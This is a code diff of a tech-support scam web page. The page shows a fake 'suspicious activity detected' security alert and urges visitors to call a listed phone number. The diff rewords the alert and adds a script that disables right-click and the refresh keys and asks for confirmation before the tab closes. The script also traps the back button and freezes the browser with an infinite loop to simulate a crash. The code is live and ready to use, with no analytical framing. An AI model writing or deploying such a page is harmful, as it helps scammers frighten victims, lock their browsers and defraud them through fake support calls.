@@ -87,7 +87,7 @@
       font-size: 16px;
       padding: 15px;
       border-radius: 6px;
-      text-decoration: none;  /* No underline */
+      text-decoration: none;
       margin-bottom: 30px;
     }
 
@@ -151,8 +151,7 @@
       </div>
       <div class="alert-message">
         Suspicious activity detected on your device. For your protection and security we've temporarily restricted access.
-        This is a precautionary measure to ensure the safety or any financial loss.
-        Please get in touch with the support for more information.
+         Please get in touch with the support team for more information.
       </div>
       <a class="call-box" href="tel:+18339219241">
         <i>📞</i> Call: +1(833)921-9241
@@ -176,5 +175,40 @@
       </div>
     </div>
   </main>
+
+  <!-- 🚫 Block navigation, refresh, and freeze the page -->
+  <script>
+    // Disable right-click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    // Disable refresh keys and backspace
+    document.addEventListener('keydown', function (e) {
+      const key = e.key.toLowerCase();
+      if (
+        key === "f5" ||
+        (e.ctrlKey && key === "r") ||
+        (e.metaKey && key === "r") ||
+        (key === "backspace" && !['input', 'textarea'].includes(document.activeElement.tagName.toLowerCase()))
+      ) {
+        e.preventDefault();
+      }
+    });
+
+    // Prevent tab close or refresh
+    window.onbeforeunload = function () {
+      return "Are you sure you want to leave this page?";
+    };
+
+    // Block back button
+    history.pushState(null, "", location.href);
+    window.addEventListener("popstate", function () {
+      history.pushState(null, "", location.href);
+    });
+
+    // Freeze page (simulated crash)
+    setTimeout(() => {
+      while (true) {}
+    }, 1000);
+  </script>
 </body>
 </html>
